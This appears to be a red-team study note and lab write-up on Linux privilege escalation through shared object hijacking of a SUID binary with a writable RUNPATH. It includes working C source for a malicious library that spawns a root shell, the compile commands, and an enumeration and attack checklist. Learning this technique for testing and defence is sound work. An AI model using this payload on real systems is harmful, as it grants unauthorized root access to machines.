# Linux Privilege Escalation – Shared Object Hijacking

## Overview

Shared Object Hijacking occurs when a program loads a **dynamic library (.so)** from an insecure or user-controlled location.

If the binary runs with **elevated privileges** (e.g. SUID root), an attacker can replace the expected library with a **malicious version**, resulting in execution of arbitrary code as root.

This technique commonly appears in:

- internally developed applications
- misconfigured build environments
- poorly secured development directories
- legacy software deployments
- improperly configured RUNPATH or RPATH settings

---

# Why Shared Object Hijacking Works

Linux binaries often depend on shared libraries.

When a binary executes, the dynamic linker searches for required libraries in:

1. RUNPATH / RPATH
2. LD_LIBRARY_PATH
3. standard directories (/lib, /usr/lib)
4. system linker cache

If an attacker can control one of these locations, they can replace a legitimate library with a malicious one.

When the binary executes:

the malicious library runs with the binary’s privileges.

If the binary is SUID root → root shell.

---

# Identifying Vulnerable Binaries

Example SUID binary:

```bash
ls -la payroll
```

Output:

```text
-rwsr-xr-x 1 root root 16728 Sep 1 22:05 payroll
```

Key indicator:

```
s
```

This indicates the **SETUID bit** is set, meaning the binary runs with the owner's privileges (root).

---

# Inspect Library Dependencies

Use ldd to determine which libraries the binary loads:

```bash
ldd payroll
```

Example output:

```text
linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

Observation:

```
libshared.so => /development/libshared.so
```

This is not a standard system path.

Custom library paths are high-value targets.

---

# Inspect RUNPATH Configuration

RUNPATH specifies directories searched before standard library locations.

Check using readelf:

```bash
readelf -d payroll | grep PATH
```

Example output:

```text
0x000000000000001d (RUNPATH) Library runpath: [/development]
```

This confirms:

the binary loads libraries from /development.

---

# Identify Writable Library Path

Check permissions:

```bash
ls -la /development
```

Example:

```text
drwxrwxrwx 2 root root 4096 Sep 1 22:06 .
```

World-writable directory:

high risk configuration.

Any user can place malicious libraries here.

---

# Confirm Function Dependency

If unsure which function is required, attempt loading a placeholder library:

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

Execute binary:

```bash
./payroll
```

Example error:

```text
symbol lookup error: undefined symbol: dbquery
```

This indicates the binary expects function:

```
dbquery()
```

---

# Creating Malicious Shared Library

Create source file:

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");

    setuid(0);
    setgid(0);

    system("/bin/sh -p");
}
```

Explanation:

| Function | Purpose |
|---------|---------|
| dbquery | matches expected symbol |
| setuid(0) | switch to root |
| setgid(0) | ensure root group |
| system("/bin/sh -p") | spawn root shell |
| printf | confirmation output |

---

# Compile Malicious Library

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

Flags:

| flag | meaning |
|------|--------|
| -fPIC | position independent code |
| -shared | create shared object |
| -o | output file |

---

# Execute Vulnerable Binary

```bash
./payroll
```

Example output:

```text
***************Inlane Freight Employee Database***************

Malicious library loaded

# id
uid=0(root) gid=1000(user)
```

Root shell obtained.

---

# Attack Workflow Summary

## 1. Identify SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

## 2. Inspect dependencies

```bash
ldd <binary>
```

---

## 3. Identify non-standard library paths

Look for:

```
/opt/
/tmp/
/dev/
/home/
/development/
```

---

## 4. Check RUNPATH

```bash
readelf -d <binary>
```

---

## 5. Confirm writable directory

```bash
ls -ld <directory>
```

---

## 6. Identify missing function symbols

Test execution errors.

---

## 7. Create malicious shared object

```c
void function_name(){
    setuid(0);
    system("/bin/sh");
}
```

---

## 8. Compile library

```bash
gcc exploit.c -fPIC -shared -o malicious.so
```

---

## 9. Execute vulnerable binary

```bash
./binary
```

---

# Enumeration Checklist

## Locate SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

## Inspect binary dependencies

```bash
ldd binary
```

---

## Check runpath entries

```bash
readelf -d binary | grep PATH
```

---

## Identify writable directories

```bash
find / -type d -writable 2>/dev/null
```

---

## Search for custom libraries

```bash
find / -name "*.so" 2>/dev/null
```

---

# Common Misconfigurations

## Writable RUNPATH directories

Example:

```
/development
/tmp
/home/user/lib
```

---

## Hardcoded library paths in development builds

Often seen in:

internal applications

---

## Relative library paths

Example:

```
./libshared.so
```

---

## Missing integrity verification

Libraries not validated before loading.

---

# Comparison with LD_PRELOAD

| Technique | Requirement |
|----------|------------|
| LD_PRELOAD | sudo env_keep |
| Shared Object Hijacking | writable library path |
| RPATH abuse | insecure build config |
| LD_LIBRARY_PATH | controllable environment |

---

# Quick Cheatsheet

## Find SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

## Check dependencies

```bash
ldd binary
```

---

## Check RUNPATH

```bash
readelf -d binary | grep PATH
```

---

## Compile malicious library

```bash
gcc exploit.c -fPIC -shared -o malicious.so
```

---

## Execute binary

```bash
./binary
```

---

# Key Takeaways

- shared object hijacking targets dynamic linking behaviour
- writable library paths are high-value escalation vectors
- RUNPATH misconfigurations frequently occur in development builds
- SUID binaries significantly increase exploit impact
- matching expected function names is critical
- malicious libraries execute with binary privileges
- commonly seen in internal enterprise applications
- effective technique when sudo access is restricted
- enumeration of library paths is essential during post-exploitation

---

# Tags

#linux
#privilege-escalation
#shared-objects
#so-hijacking
#runpath
#rpath
#suid
#post-exploitation
#red-team
#enumeration
#obsidian